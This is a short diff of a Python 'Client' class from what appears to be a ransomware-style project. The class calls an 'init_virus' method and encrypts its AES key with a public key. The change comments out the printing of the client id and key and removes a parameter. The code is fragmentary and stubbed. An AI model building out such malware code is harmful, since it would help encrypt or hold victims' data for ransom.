@@ -21,8 +21,8 @@ class Client():
     def __init__(self):
         self.id = uuid.uuid1().hex
         self.aes_key = self.gen_key()
-        print(self.id)
-        print(self.aes_key)
+        # print(self.id)
+        # print(self.aes_key)
         self.init_virus()
 
     def init_virus(self):
@@ -40,7 +40,7 @@ class Client():
         print('generating key...')
         return 'aes_key'
 
-    def enc_key(self, pubkey=PUB_KEY, max_len=100, sign=False):
+    def enc_key(self, pubkey=PUB_KEY, sign=False):
         print('encryptint key...')
         mes = b64encode(self.aes_key.encode())
         mlen = len(mes)
